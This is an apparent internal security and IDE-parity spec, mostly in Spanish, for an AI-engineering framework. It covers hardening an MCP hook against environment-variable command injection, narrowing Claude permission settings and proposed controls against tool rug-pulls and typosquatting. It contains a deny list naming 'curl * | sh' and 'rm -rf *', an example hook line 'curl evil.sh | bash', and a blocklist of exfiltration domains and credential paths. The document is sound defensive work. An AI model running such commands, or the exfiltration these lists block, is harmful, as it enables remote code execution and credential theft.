# Adoption Sub-Spec S5 — MCP Sentinel Hardening + IDE Parity

**Discovery Date**: 2026-04-24
**Context**: Diagnóstico ai-engineering v4 adoption. MCP Sentinel audit verdict YELLOW: 1 MEDIUM (env-var RCE surface en `mcp-health.py`), 1 LOW (`allow:*` demasiado amplio). Paridad IDE con 3 gaps: `/ai-explore` se llama `@Explorer` en Copilot (no se encuentra por nombre familiar), `GEMINI.md` declara 44 skills cuando hay 47, no existe `.github/chatmodes/`. Backlog post-S1.
**Spec**: backlog — pendiente spec formal

## Problem

### Seguridad (2 findings)
1. `.ai-engineering/scripts/hooks/mcp-health.py:178` lee `AIE_MCP_CMD_<SERVER>` de env y ejecuta via `shlex.split` + `subprocess.run` sin allowlist de binarios. Si el env está comprometido (malicious `.env`, CI secret injection) → RCE en cada sesión Claude.
2. `.claude/settings.json` tiene `allow: ["*"]` — demasiado permisivo. `.claude/settings.local.json` tiene entradas machine-specific (`/Users/soydachi/...`) que fallarán o se otorgarán inesperadamente en otras máquinas.

### Paridad IDE (3 gaps)
1. **Naming mismatch**: `.github/agents/explore.agent.md:2` → `name: "Explorer"` (display_name). Claude/Codex/Gemini usan `ai-explore`. Usuarios que migran desde Claude Code no encuentran el agent en Copilot.
2. **GEMINI.md stale**: `src/ai_engineering/templates/project/GEMINI.md:110` hardcodea `## Skills (44)`, disk count real = 47. Template hand-maintained, no auto-regenera.
3. **Sin chatmodes**: no existe `.github/chatmodes/` para crear un alias slash-command `/ai-explore` en Copilot.

### `/ai-platform-audit` gaps
- No verifica naming consistency entre IDEs (solo counts).
- No flaggea GEMINI.md staleness.

## Findings

### MCP Sentinel verdict: YELLOW
- 0 código malicioso, 0 exfil, 0 backdoors
- 1 MEDIUM, 1 LOW
- 11 commits a hooks en 6 meses — commit `62ef08fc` añadió `shlex.split` + URL validation como HARDENING declarado (PR #273). Cero anomalías tipo XZ.

### Evidence citations
| Gap | File | Line |
|---|---|---|
| env-var RCE | `.ai-engineering/scripts/hooks/mcp-health.py` | 178-219 |
| allow:* amplio | `.claude/settings.json` | permissions section |
| Explorer name | `.github/agents/explore.agent.md` | 2 |
| GEMINI.md stale | `src/ai_engineering/templates/project/GEMINI.md` | 110 |
| hand-maintained comment | `scripts/sync_command_mirrors.py` | 1535 |

### Qué paridad SÍ funciona bien
- 47/47 skills en Claude/Codex/Gemini, 46/47 en Copilot (ai-analyze-permissions excluido por diseño con `copilot_compatible: false`).
- `/ai-platform-audit` skill YA existe en `.claude/skills/ai-platform-audit/SKILL.md` — solo hay que extenderlo.

## Code Examples

### 1. MCP Sentinel — allowlist binarios
```python
# .ai-engineering/scripts/hooks/mcp-health.py
_ALLOWED_MCP_BINARIES = frozenset({"npx", "node", "python3", "bunx", "deno", "cargo", "go", "dotnet"})

def _resolve_mcp_cmd(server: str) -> list[str] | None:
    cmd = os.environ.get(f"AIE_MCP_CMD_{server.upper()}")
    if not cmd:
        return None
    parts = shlex.split(cmd)
    if not parts or parts[0] not in _ALLOWED_MCP_BINARIES:
        _log_warn(f"MCP cmd binary {parts[0]!r} not in allowlist; ignoring")
        return None
    return parts
```

### 2. Narrow `allow: ["*"]`
```json
// .claude/settings.json
{
  "permissions": {
    "allow": [
      "Read", "Write", "Edit", "MultiEdit", "Bash", "Agent",
      "Glob", "Grep", "Skill", "TaskCreate", "TaskUpdate",
      "mcp__context7__*", "mcp__notebooklm-mcp__*"
    ],
    "deny": [
      "Bash(rm -rf *)", "Bash(sudo *)", "Bash(curl * | sh)",
      "Bash(wget -O-*)", "Bash(eval *$*)"
    ]
  }
}
```

### 3. `/ai-explore` naming — Option A: rename en sync script
```python
# scripts/sync_command_mirrors.py AGENT_METADATA
AGENT_METADATA["explore"] = {
    "name": "ai-explore",   # antes: "Explorer"
    "display_name": "Explorer",  # opcional, UI only
    ...
}
```

### 3b. `/ai-explore` naming — Option B: chatmode alias
```markdown
# .github/chatmodes/ai-explore.chatmode.md (nuevo)
---
name: /ai-explore
description: Alias for @Explorer agent
handler: agent:Explorer
---
```

### 4. GEMINI.md auto-generado
```python
# scripts/sync_command_mirrors.py nuevo bloque
def write_gemini_md(canonical_skills: list[Skill]):
    template = read("src/ai_engineering/templates/project/GEMINI.md")
    rendered = template.replace("__SKILL_COUNT__", str(len(canonical_skills)))
    write(".gemini/GEMINI.md", rendered)

# Template line 110:
#   ## Skills (__SKILL_COUNT__)
```

### 5. `/ai-platform-audit` extender
```markdown
# .claude/skills/ai-platform-audit/SKILL.md nuevos checks:

6. Agent naming consistency:
   Extract `name:` from .{claude,github,codex,gemini}/agents/*.md.
   Flag when name ≠ slug (e.g., "Explorer" vs "ai-explore" in Copilot).

7. GEMINI.md skill count freshness:
   Extract N from "## Skills (N)" in .gemini/GEMINI.md.
   Compare vs `ls .gemini/skills/ | wc -l`. Flag mismatch.
```

## Pitfalls

- **NO break existing allowlists**: narrowing `allow:*` requiere migration docs + deprecation warning 30d. Usuarios con flujos automáticos pueden romperse.
- **MCP allowlist** debe incluir `cargo`, `go`, `dotnet` si el framework soporta enterprise Java/Go/Rust stacks.
- **Rename Explorer → ai-explore** puede romper usuarios que ya invocan `@Explorer`. Estrategia: dual-name 30d (alias both names) antes de depreca.
- **Sentinel está hoy VERDE funcional** — las dos findings son defense-in-depth, no incident. No crear pánico en PR narrative.
- **GEMINI.md regen**: asegurar que `translate_refs()` se hace ANTES del render `__SKILL_COUNT__`. Orden importa.
- **settings.local.json** con paths absolutos: esto es user-private (git-ignored) — cleanup va como recomendación, no cambio en repo tracked.

## Related

- Diagnóstico Wave 1 Agent A5 (Sentinel) y A6 (paridad IDE) en brainstorm 2026-04-24.
- Related: transversal con S4 (verbosity surface, skill audit tooling).
- CLAUDE.md Don't #7 — "NEVER disable or modify `.claude/settings.json` deny rules". Nosotros AMPLIAMOS deny, no borramos existentes. ✅
- Files candidatos:
  - `.ai-engineering/scripts/hooks/mcp-health.py`
  - `.claude/settings.json`
  - `scripts/sync_command_mirrors.py` (GEMINI.md generation, AGENT_METADATA naming)
  - `src/ai_engineering/templates/project/GEMINI.md` (placeholder `__SKILL_COUNT__`)
  - `.claude/skills/ai-platform-audit/SKILL.md` (new checks 6 + 7)
  - `.github/chatmodes/ai-explore.chatmode.md` (nuevo, si opt por alias path)

---

## Hallazgos adicionales — NotebookLM Sentinel AI (2026-04-25)

Al integrar el research del notebook "Securing Claude MCP Tools with Sentinel AI" en spec-101, se incorporaron al spec los 2 controles **CRITICAL** de installer security (compound shell detection + env-var scrubbing en `_safe_run`). Los siguientes 5 controles son **HIGH/MEDIUM** y aplican mejor al territorio de S5 (MCP Sentinel + skill governance) que al installer:

### H1 — Rug-pull detection: hashing de tool definitions (HIGH)

**Hallazgo**: además del SHA256 pinning del binary descargado, hashear cada entry de `required_tools.<stack>.<tool>` en el manifest. Si el manifest cambia silenciosamente entre runs (alguien añade `pre_install_hook: curl evil.sh | bash` a un tool aprobado), se debe disparar un alerta CRITICAL. El patrón viene de **MCPhound rug-pull detection** y **Sentinel SS-022** (Notebook 2 src 1, 3): "Compare current scan against a saved baseline; flags schema mutations, additions, removals as Critical / High / Medium".

**Implementación propuesta**:
- `state/manifest.py.load_required_tools` calcula SHA256 de cada tool spec y persiste en `install-state.json` como `tool_spec_hash: <sha>` por tool
- En cada run, compara con el hash anterior; mismatch → log CRITICAL + bloquea hasta CODEOWNERS review
- Diff visual entre baseline y current scan al estilo `sentinel-scan diff <baseline.json> <current.json>`

### H2 — Hash-chained audit trail (HIGH)

**Hallazgo**: estandar logs son tamper-able durante un compromise. **Oktsec** patron (Notebook 2 src 11, 12): cada subprocess invocation, identity verification, security verdict cryptographically immutable mediante hash chain. Cada entry contiene `prev_hash` apuntando al SHA256 de la entry anterior; truncar la cadena rompe la verificación.

**Implementación propuesta**:
- `state/framework-events.ndjson` y `state/install-state.json` ganan campo `prev_event_hash` por entry
- Función `verify_audit_chain()` recorre eventos y valida la cadena
- Falla la cadena → flag tampering critical con timestamp del último evento válido
- Coste: ~64 bytes por evento; tradeoff con auditability cumple banking/healthcare

### M1 — Typosquatting detection en validate manifest (MEDIUM)

**Hallazgo**: **MCPhound** (Notebook 2 src 1, 2) usa Levenshtein distance contra registries conocidos: `gitleeks` ≠ `gitleaks` (1 char), `senigrep` ≠ `semgrep` (transposición). Para spec-101 sería `ai-eng validate manifest` ejecutando Levenshtein contra una lista canónica de tools por stack.

**Implementación propuesta**:
- `installer/_canonical_tool_names.py` con lista canónica autoritativa (mantenida en CI)
- `validate.py` añade check: para cada tool en `required_tools`, calcular Levenshtein distance(name, canonical_name) — si distance ∈ [1,2] y nombre no es exacto match, fail con sugerencia "did you mean: <canonical>?"
- Patrón evita ataque tipo: PR malicioso introduce `gitleeks` (typosquat de gitleaks); validate manifest lo detecta antes de merge

### M2 — Coherence/behavioral mismatch analysis (MEDIUM, mejor en S5)

**Hallazgo**: Sentinel **coherence analysis** (Notebook 2 src 4, 5, 17): una skill que dice ser "markdown formatter" pero intenta acceder a `~/.ssh/` es flag CRITICAL. Aplica más a skills que a tools (las tools son cli binaries, no agentes con instrucciones). Para spec-101 sería: **verify cmd debe matchear declared purpose**.

**Implementación propuesta**:
- Annotar cada tool en registry con `declared_purpose: <enum>` (linter, formatter, test-runner, security-scanner, etc.)
- CI lint compara verify cmd vs purpose: un linter no debería hacer network calls en verify; un security scanner sí
- Para skills (S5 territory natural), el patrón se vuelve más sofisticado: declarative `capabilities:` en frontmatter

### M3 — Cross-tool attack path graphing (MEDIUM, MCPhound-style — mejor en S5)

**Hallazgo**: **MCPhound** (Notebook 2 src 18, 19): construye directed multigraph de servers + capabilities, encuentra multi-hop chains: `filesystem + fetch = SSH keys exfil`, `cloud + network = AWS keys exfil`. Para spec-101 sería sobre tools-y-hooks combinados: si una tool tiene file-read y otra tiene network-out, hay attack path.

**Implementación propuesta** (a nivel S5, no spec-101):
- Generar grafo de capabilities de skills + agents + MCP servers
- Detectar 4-hop chains que matchen patrones conocidos (data exfil, shell-via-git, memory poisoning, credential theft)
- Output como SARIF para integración con GitHub Code Scanning

### M4 — Sentinel-style suppression file (MEDIUM)

**Hallazgo**: `.sentinel-suppressions.json` (Notebook 2 src 13): cuando un dev bypassa un check, registrar en archivo auditable con justification, approver, expiry. **Technical-debt exposure banner**: "if these N suppressions were removed, your grade would be X (Y/100) instead of Z (W/100)".

**Implementación propuesta**:
- Ya tenemos `decision-store.json` para risk acceptance (alineado)
- Añadir el patrón "exposure banner" al output de `ai-eng verify`: mostrar grade actual + grade-sin-suppressions
- Hacer las suppressions visibles en cada PR review

### Threat model expansion (banking/healthcare)

Notebook 2 src 7, 8: en context enterprise, asumir que el host puede estar comprometido. Controles adicionales **deferred** a S5 o a un spec dedicado:
- Sensitive directories explicit DENY (incluso si están en `~/`): `.env`, `.aws/credentials`, `~/.ssh/id_rsa`, etc.
- Known-bad-domain blocklist hardcoded: `pastebin.com`, `ngrok`, `serveo`, `webhook.site`, raw-IP URLs
- Container/sandbox isolation para installer (read-only fs, ASLR, CPU limits) — mejor en framework-level orchestration que en installer
- Cryptographic signing de tool definitions (cosign/sigstore) — future spec post S5

### Files candidatos para implementar H1-M4 cuando se haga el spec S5

- `state/manifest.py` — SHA256 hashing de tool specs (H1)
- `state/audit_chain.py` (nuevo) — hash chain validator (H2)
- `installer/_canonical_tool_names.py` (nuevo) — lista autoritativa para typosquat (M1)
- `installer/tool_registry.py` — annotación `declared_purpose` (M2)
- `tests/security/test_attack_paths.py` (nuevo, S5) — graphing (M3)
- CLI: `ai-eng verify --show-suppressions` con exposure banner (M4)

### Source citations (NotebookLM 2026-04-25)

- Notebook ID `e0dc5212-7418-467d-98c1-6178e6f622d8` ("Securing Claude MCP Tools with Sentinel AI")
- Source IDs cited inline (1=SS-022 Rug Pull, 2=MCPhound typosquat, 11+12=Oktsec hash-chained audit, 13=Sentinel suppressions, 18+19=MCPhound attack-path)
